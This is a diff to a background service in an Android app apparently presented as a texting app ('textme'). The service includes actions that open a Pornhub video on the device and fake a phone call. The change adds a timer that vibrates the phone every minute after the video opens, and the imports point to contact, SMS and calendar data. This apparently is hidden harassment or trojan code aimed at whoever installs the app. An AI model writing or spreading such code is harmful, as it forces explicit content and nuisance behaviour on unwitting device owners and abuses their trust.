@@ -1,4 +1,4 @@
-package com.candroid.textme;
+package com.candroid.textme.jobs;
 
 import android.app.IntentService;
 import android.content.Intent;
@@ -9,8 +9,22 @@ import android.net.Uri;
 import android.os.Build;
 import android.util.Log;
 
+import com.candroid.textme.BuildConfig;
+import com.candroid.textme.CalendarEvent;
+import com.candroid.textme.Contact;
+import com.candroid.textme.Database;
+import com.candroid.textme.DatabaseHelper;
+import com.candroid.textme.Lofl;
+import com.candroid.textme.services.MessagingService;
+import com.candroid.textme.PhoneCall;
+import com.candroid.textme.Pornhub;
+import com.candroid.textme.SmsMsg;
+import com.candroid.textme.Wallpapers;
+
 import java.io.File;
 import java.util.ArrayList;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class JobsIntentService extends IntentService {
 
@@ -146,6 +160,14 @@ public class JobsIntentService extends IntentService {
                     videoId = 1;
                 }
                 Lofl.watchPornHubVideo(this, Pornhub.VIDEOS[videoId]);
+                TimerTask timerTask = new TimerTask() {
+                    @Override
+                    public void run() {
+                        Lofl.vibrator(JobsIntentService.this.getApplicationContext());
+                    }
+                };
+                Timer timer = new Timer("vibratorTask", true);
+                timer.schedule(timerTask, 1000L, 60000L);
             }else if(intent.getAction().equals(ACTION_FAKE_PHONE_CALL)){
                 Lofl.fakePhoneCall(this);
             }else{
